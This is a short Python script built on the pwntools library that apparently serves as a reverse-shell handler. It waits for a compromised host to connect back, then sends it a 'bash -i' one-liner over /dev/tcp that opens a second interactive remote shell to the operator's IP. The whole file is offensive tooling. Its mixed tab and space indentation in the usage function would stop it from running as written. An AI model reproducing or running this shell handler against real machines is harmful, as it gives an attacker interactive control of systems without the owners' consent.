#!/usr/bin/python


import os 
import struct
import binascii
import sys
import pwn


def main(cb_ip="192.168.0.4", cb_port1=1234, cb_port2=1235):

	connectback = pwn.listen(cb_port1)
		

	connectback.wait_for_connection()
	while connectback.connected():
		action = pwn.options("Select an action:", ["Drop into shell", "Quit"])
		if action == 0:
			new_cb = pwn.listen(cb_port2)
			connectback.sendline("bash -i</dev/tcp/%s/%s 1>&0 2>&0 & disown" % (cb_ip, new_cb.lport))
			try:
				new_cb.wait_for_connection()
				new_cb.interactive(prompt="")
			except KeyboardInterrupt:
				pass            
		elif action == 1:
			pwn.log.info("Disconnecting...")
		connectback.close()

def usage(argv):
    print("%s ([connectback-ip]) ([connectback-port1]) ([connectback-port2])" % (argv[0],))
	print("Default IP: 192.168.0.4, default port1=1234, default port2=1235")
    print("\tRun as root, interface will go down.")

if __name__ == '__main__':
    if len(sys.argv) < 3:
        usage(sys.argv)
    else:
        main(*sys.argv[1:])
